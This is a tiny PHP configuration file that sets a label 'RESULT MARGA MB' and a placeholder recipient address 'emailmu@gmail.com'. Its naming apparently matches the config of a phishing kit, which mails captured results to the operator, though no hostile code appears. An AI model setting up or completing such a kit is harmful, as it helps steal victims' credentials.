<?php 
$nama = "RESULT MARGA MB";
$mailzz = "emailmu@gmail.com";
?>